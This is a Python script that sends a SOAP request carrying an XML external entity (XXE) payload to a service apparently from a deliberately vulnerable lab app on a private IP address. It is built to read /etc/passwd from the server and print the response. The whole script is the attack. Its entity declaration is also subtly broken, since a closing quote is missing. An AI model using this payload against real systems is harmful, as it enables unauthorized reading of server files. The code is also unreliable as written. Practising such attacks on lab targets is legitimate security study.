import requests

url = "http://192.168.0.19:8080/dvwsuserservice/"
headers = {
    "Content-Type": "text/xml;charset=UTF-8",
    "SOAPAction": "Username",
    "User-Agent": "Mozilla/5.0",
}

payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY exploit PUBLIC "-//X//TEXT Foo//EN" "file:///etc/passwd> ]>
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                  xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                  xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:urn="urn:examples:usernameservice">
  <soapenv:Header/>
  <soapenv:Body>
    <urn:Username soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
      <username xsi:type="xsd:string">&exploit;</username>
    </urn:Username>
  </soapenv:Body>
</soapenv:Envelope>'''

response = requests.post(url, headers=headers, data=payload.encode('utf-8'))

print(f"Status: {response.status_code}")
print("Response:\n", response.text)
